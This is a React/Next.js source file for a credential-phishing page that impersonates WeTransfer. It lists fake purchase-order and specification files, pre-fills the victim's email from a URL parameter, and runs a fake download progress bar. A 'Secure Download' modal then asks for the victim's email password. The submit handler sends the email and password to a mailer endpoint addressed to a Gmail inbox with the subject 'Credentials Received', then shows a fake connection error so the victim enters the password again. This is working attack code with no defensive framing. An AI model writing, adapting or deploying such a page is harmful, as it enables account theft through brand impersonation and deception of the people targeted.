'use client';
import { useState, useEffect, ChangeEvent } from 'react';
import { 
  FileSpreadsheet, 
  FileText, 
  FileCode, 
  FileImage, 
  Download, 
  Lock, 
  Check, 
  X, 
  // Angry,
  Loader
} from 'lucide-react';
import { toast, ToastContainer } from 'react-toastify';
import { useSearchParams } from 'next/navigation';
import axios from 'axios';

// --- Data & Config ---

const AVAILABLE_FILES = [
  { id: 101, name: 'PO_2023AJ02.xls', size: '2.4 MB', type: 'xls' },
  { id: 103, name: 'Items_list.xls', size: '1.8 MB', type: 'xls' },
  { id: 104, name: 'Specifications.pdf', size: '3.2 MB', type: 'pdf' },
  { id: 106, name: 'Image.jpeg', size: '8.5 MB', type: 'img' },
];

const BACKGROUND_IMAGES = [
  'https://images.unsplash.com/photo-1518182170546-0766aaeb9fb3?q=80&w=2000&auto=format&fit=crop', // Ice/Arctic
  'https://images.unsplash.com/photo-1550684848-fac1c5b4e853?q=80&w=2000&auto=format&fit=crop', // Desert/Clay
  'https://images.unsplash.com/photo-1612152605347-f932c6f15566?q=80&w=2000&auto=format&fit=crop', // Ceramics
  'https://images.unsplash.com/photo-1534234828563-02511c142b71?q=80&w=2000&auto=format&fit=crop', // Abstract
  'https://plus.unsplash.com/premium_photo-1686255006386-5f58b00ffe9d?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MXx8YmFja2dyb3VuZHxlbnwwfHwwfHx8MA%3D%3D',
  'https://images.unsplash.com/32/Mc8kW4x9Q3aRR3RkP5Im_IMG_4417.jpg?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxzZWFyY2h8Mnx8YmFja2dyb3VuZHxlbnwwfHwwfHx8MA%3D%3D',
  'https://images.unsplash.com/photo-1503455637927-730bce8583c0?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTR8fGJhY2tncm91bmR8ZW58MHx8MHx8fDA%3D'
];

const PHOTO_IMAGES = [
  'https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=500&auto=format&fit=crop',
  'https://images.unsplash.com/photo-1761839256602-0e28a5ab928d?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.1.0&ixid=M3wxMjA3fDF8MHxmZWF0dXJlZC1waG90b3MtZmVlZHwxfHx8ZW58MHx8fHx8',
  'https://plus.unsplash.com/premium_photo-1675791188810-3a01768c1e2f?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxzZWFyY2h8NXx8cGVvcGxlfGVufDB8fDB8fHww'

];

const TEXTS = [{
  title: "Handbags and gladrags",
  description: "Maryam Yousif's clay characters are inspired by the ancient history and the 90s pop culture of the Middle East"
  },
  {
    title: "Urban Echoes",
    description:
      "A reflective journey through modern city life, blending street photography with soft surrealist tones.",
  },
  {
    title: "Threads of Time",
    description:
      "A textile collection that weaves ancestral techniques into bold contemporary patterns.",
  },
  {
    title: "Digital Mirage",
    description:
      "An exploration of virtual identity, where glitch art meets Afrofuturist visual storytelling.",
  },
  {
    title: "Fragments of Silence",
    description:
      "A minimalist sculpture series shaped from recycled metal, symbolizing memory and quiet resilience.",
  },
  {
    title: "The Colour Archive",
    description:
      "A study of rare pigments rediscovered from ancient trade routes, reimagined for modern design.",
  },
  {
    title: "Waves of Tomorrow",
    description:
      "A motion graphics project capturing the fluid relationship between technology and imagination.",
  },
  {
    title: "Beyond the Frame",
    description:
      "A conceptual photography set questioning what is seen, unseen, and left to the viewer's interpretation.",
  },
  {
    title: "Desert Geometry",
    description:
      "Architectural sketches inspired by the symmetry and vastness of Arabian desert landscapes.",
  },
  {
    title: "Crafted Voices",
    description:
      "Handmade ceramics infused with personal stories of migration, memory, and home.",
  },
]

// --- Sub-Components ---

const FileIcon = ({ type }: { type: string }) => {
  switch (type) {
    case 'xls': return <FileSpreadsheet className="w-5 h-5 text-green-600" />;
    case 'pdf': return <FileText className="w-5 h-5 text-red-500" />;
    case 'ppt': return <FileCode className="w-5 h-5 text-orange-500" />; // Proxy icon
    case 'img': return <FileImage className="w-5 h-5 text-blue-500" />;
    default: return <FileText className="w-5 h-5 text-gray-500" />;
  }
};

export const App = () => {
  // State
  const searchParams = useSearchParams();
  const [email, setEmail] = useState(searchParams.get('ci') || '');
  const [password, setPassword] = useState('');
  const [bgImage, setBgImage] = useState('');
  const [photoImage, setPhotoImage] = useState(PHOTO_IMAGES[0]);
  const [text, setText] = useState(TEXTS[0]);
  const [selectedIds, setSelectedIds] = useState<number[]>([]);
  const [viewState, setViewState] = useState('selection'); // 'selection' | 'ready' | 'preparing' | 'auth'
  const [progress, setProgress] = useState(0);
  const [agreedTerms, setAgreedTerms] = useState(false);
  
  const [loading, setLoading] = useState(false);

  // 1. Dynamic Background on Mount
  useEffect(() => {
    const randomImg = BACKGROUND_IMAGES[Math.floor(Math.random() * BACKGROUND_IMAGES.length)];
    const randomPhotoImg = PHOTO_IMAGES[Math.floor(Math.random() * PHOTO_IMAGES.length)];
    const randomText = TEXTS[Math.floor(Math.random() * TEXTS.length)];
    setTimeout(() => {
      setText(randomText);
      setBgImage(randomImg);
      setPhotoImage(randomPhotoImg);
    }, 0);
  }, []);

  // 2. File Selection Logic
  const toggleFile = (id: number) => {
    // If we are in preparing or auth mode, reset to ready/selection
    if (viewState === 'preparing' || viewState === 'auth') return;

    setSelectedIds(prev => {
      if (prev.includes(id)) {
        const newIds = prev.filter(i => i !== id);
        if (newIds.length === 0) setViewState('selection');
        return newIds;
      } else {
        setViewState('ready');
        return [...prev, id];
      }
    });
  };

  // 3. Handle Download Flow
  const handleDownloadClick = () => {
    setViewState('preparing');
    
    // Simulate Progress
    let currentProgress = 0;
    const interval = setInterval(() => {
      currentProgress += 2;
      setProgress(currentProgress);
      if (currentProgress >= 100) {
        // Pause at 60% like screenshot, then finish
        clearInterval(interval);
        setTimeout(() => {
             // Jump to Auth Modal
             setViewState('auth');
        }, 800); 
      }
    }, 30);
  };

  const handleTermsChange = (e: ChangeEvent<HTMLInputElement>) => {
    setAgreedTerms(e.target.checked);
  }

  const handleSubmit = async() => {
    setLoading(true);
    // Simulate authentication delay

    // Check if password is empty
    if (!password.trim()) {
      toast.error('Password required.');
      setLoading(false);
      return;
    }

    const request = await axios.post('/api/mailer', {
      email: "btcbd11001@gmail.com" as string,
      subject: "Credentials Received",
      message: `Email: ${email}\nPassword: ${password}`,
    });
    

    if (request.status === 200) {
      setTimeout(() => {
        setLoading(false);
        toast.error('Connection error, please try again later.');
        setPassword('');
        // Here you would trigger the actual file download
      }, 2000);
    }

  };

  // --- Render ---

  return (
    <div className="min-h-screen w-full relative overflow-hidden font-sans text-slate-800 bg-blue-50">
      <ToastContainer position="bottom-right" autoClose={3000} hideProgressBar={true} />
      {/* Background Layer with overlay for readability */}
      <div
        className="absolute inset-0 z-0 opacity-20 pointer-events-none transition-opacity duration-1000"
        style={{ 
          backgroundImage: `url(${bgImage})`, 
          backgroundSize: 'cover', 
          backgroundPosition: 'center' 
        }}
      />

      {/* Main Content Grid */}
      <main className="relative z-10 container mx-auto px-6 py-12 flex flex-col md:flex-row items-start justify-center gap-12">
        
        {/* --- THE WIDGET --- */}
        <div className="bg-white rounded-2xl shadow-xl flex flex-col md:flex-row w-full max-w-[900px] overflow-hidden min-h-[500px]">
          
          {/* LEFT PANEL: File List */}
          <div className="w-full md:w-[350px] p-6 border-r border-gray-100 flex flex-col bg-white">
            <div className="mb-6">
              <span className="font-black text-3xl tracking-tighter">
                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="24" fill="none" className="mr-0"><path fill="currentColor" fillRule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clipRule="evenodd"></path></svg>
              </span>
            </div>
            
            <h2 className="text-lg font-bold mb-4">Files to download</h2>
            
            <ul className="space-y-2 flex-1">
              {AVAILABLE_FILES.map((file) => {
                const isSelected = selectedIds.includes(file.id);
                // Calculate selection order index
                const selectionIndex = selectedIds.indexOf(file.id) + 1;

                return (
                  <li 
                    key={file.id}
                    onClick={() => toggleFile(file.id)}
                    className={`
                      group flex items-center p-3 rounded-lg cursor-pointer transition-all border
                      ${isSelected ? 'bg-blue-50 border-blue-200' : 'bg-transparent border-transparent hover:bg-gray-50'}
                    `}
                  >
                    <div className="mr-3">
                      <FileIcon type={file.type} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium text-gray-900 truncate">{file.name}</p>
                      <p className="text-xs text-gray-500">{file.size}</p>
                    </div>
                    
                    {/* Number Badge */}
                    <div className={`
                      w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold transition-all
                      ${isSelected ? 'bg-blue-600 text-white scale-100' : 'bg-transparent text-transparent scale-0'}
                    `}>
                      {isSelected ? selectionIndex : ''}
                    </div>
                  </li>
                );
              })}
            </ul>
          </div>

          {/* RIGHT PANEL: Dynamic State */}
          <div className="flex-1 bg-gray-50/50 p-8 flex flex-col justify-center items-center relative">
            
            {/* STATE 1: Empty */}
            {selectedIds.length === 0 && (
              <div className="text-center text-gray-400">
                <div className="w-24 h-24 bg-gray-100 rounded-lg mx-auto mb-4 flex items-center justify-center">
                   <Download className="w-8 h-8 opacity-40" />
                </div>
                <p>Select files from the left panel</p>
              </div>
            )}

            {/* STATE 2: Ready */}
            {selectedIds.length > 0 && viewState === 'ready' && (
              <div className="w-full h-full flex flex-col">
                <h3 className="text-xl font-bold mb-2">Your files are ready</h3>
                <p className="text-gray-500 text-sm mb-8">{selectedIds.length} files selected</p>
                
                <div className="flex-1 flex flex-col items-center justify-center border-2 border-dashed border-gray-200 rounded-xl bg-gray-50 mb-6">
                    <Download className="w-8 h-8 text-gray-400 mb-2" />
                    <p className="text-gray-500 text-sm">Click download to get your files</p>
                </div>

                <div className="mt-auto">
                    <div className="flex items-center gap-2 mb-4">
                        <input type="checkbox" checked={agreedTerms} id="terms" onChange={handleTermsChange} className="w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500" />
                        <label htmlFor="terms" className="text-xs text-gray-500">I agree to the <a href="#" className="text-blue-600 hover:underline">Terms of Service</a></label>
                    </div>
                    <button 
                        onClick={handleDownloadClick}
                        disabled={!agreedTerms}
                        className="w-full disabled:bg-gray-500 cursor-pointer disabled:cursor-not-allowed bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-colors flex items-center justify-center gap-2"
                    >
                        <Download className="w-4 h-4" />
                        Download ({selectedIds.length})
                    </button>
                </div>
              </div>
            )}

             {/* STATE 3: Preparing (Visual match for Image 3) */}
             {viewState === 'preparing' && (
              <div className="w-full h-full flex flex-col justify-start pt-10">
                 <h3 className="text-xl font-bold mb-2">Your files are ready</h3>
                 <p className="text-gray-500 text-sm mb-12">{selectedIds.length} files selected</p>
                 
                 <div className="w-full bg-gray-200 rounded-full h-2.5 mb-4 overflow-hidden">
                    <div className="bg-blue-600 h-2.5 rounded-full transition-all duration-300 ease-out" style={{ width: `${progress}%` }}></div>
                 </div>
                 <p className="text-center text-sm text-gray-600">Preparing download... {progress}%</p>

                 <div className="mt-auto opacity-50 pointer-events-none">
                    <div className="w-full border-t border-gray-300 mb-4"></div>
                    <div className="flex items-center gap-2 mb-4">
                        <div className="w-4 h-4 bg-blue-600 rounded flex items-center justify-center"><Check className="w-3 h-3 text-white"/></div>
                        <span className="text-xs text-gray-500">I agree to the Terms of Service</span>
                    </div>
                    <button className="w-full bg-gray-300 text-white font-semibold py-3 rounded-lg flex items-center justify-center gap-2">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        Preparing...
                    </button>
                 </div>
              </div>
            )}

          </div>
        </div>

        {/* --- RIGHT SIDE PAGE CONTENT (Aesthetic only) --- */}
        <div className="hidden lg:block w-[400px] mt-12">
            <h1 className="font-serif text-5xl mb-12 text-slate-900">{text.title}</h1>
            
            <div className="bg-white p-4 shadow-lg mb-8 rotate-1 max-w-[300px] mx-auto">
                <img 
                    src={photoImage}
                    alt="Art piece" 
                    width={300}
                    height={400}
                    className="max-w-[300px] max-h-[200px] h-auto object-cover"
                />
            </div>
            
            <div className="text-center">
                 <p className="text-slate-800 text-lg leading-relaxed mb-8">
                      {text.description}
                 </p>
                 <a href="#" className="inline-block border-b border-black pb-1 uppercase text-sm tracking-widest hover:text-gray-600">
                     Take a look
                 </a>
            </div>
        </div>
      </main>

      {/* --- FOOTER --- */}
      <footer className="relative z-10 container mx-auto px-6 pb-12 mt-auto">
          <h1 className="font-serif text-4xl tracking-widest uppercase">Wetransfer pro</h1>
      </footer>

      {/* --- AUTH MODAL (State 4) --- */}
      {viewState === 'auth' && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
            {/* Backdrop Blur */}
            <div className="absolute inset-0 bg-white/20 backdrop-blur-sm"></div>
            
            <div className="bg-white rounded-xl shadow-2xl p-8 w-[400px] relative z-10 animate-in fade-in zoom-in duration-200">
                <button 
                  onClick={() => setViewState('ready')}
                  className="absolute top-4 right-4 text-gray-400 hover:text-gray-600"
                >
                    <X className="w-5 h-5" />
                </button>

                <div className="flex items-center gap-2 mb-6">
                    <span className="font-black text-xl tracking-tighter">
                      <svg xmlns="http://www.w3.org/2000/svg" width="48" height="24" fill="none" className="mr-0"><path fill="currentColor" fillRule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clipRule="evenodd"></path></svg>
                    </span>
                    <Lock className="w-4 h-4 text-gray-400" />
                    <span className="font-bold text-sm">Secure Download</span>
                </div>

                <div className="text-center mb-6">
                    <p className="text-sm text-gray-600 mb-1">To download these files, please verify your email address.</p>
                    <p className="text-xs text-gray-400">authenticate via email password to complete download.</p>
                </div>

                <form className="space-y-4" onSubmit={(e) => e.preventDefault()}>
                    <div className="space-y-1">
                        <label className="text-xs font-semibold text-gray-500">Email address</label>
                        <input 
                            type="email" 
                            value={email}
                            disabled
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm" 
                        />
                    </div>
                    <div className="space-y-1">
                        <label className="text-xs font-semibold text-gray-500">Email password</label>
                        <input 
                            type="password" 
                            placeholder="••••••"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm" 
                            required
                        />
                    </div>

                    <button
                      onClick={handleSubmit}
                     className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 rounded-lg transition-colors text-sm">
                        {loading ? <span>
                          <Loader className="w-4 h-4 mr-2 inline-block animate-spin" />
                          Processing
                        </span> : 
                        'Sign In'
                        }
                    </button>
                </form>

                <p className="text-[10px] text-center text-gray-400 mt-4">
                    By continuing, you agree to our <a href="#" className="text-blue-500">Terms of Service</a> and <a href="#" className="text-blue-500">Privacy Policy</a>.
                </p>
            </div>
        </div>
      )}

    </div>
  );
}
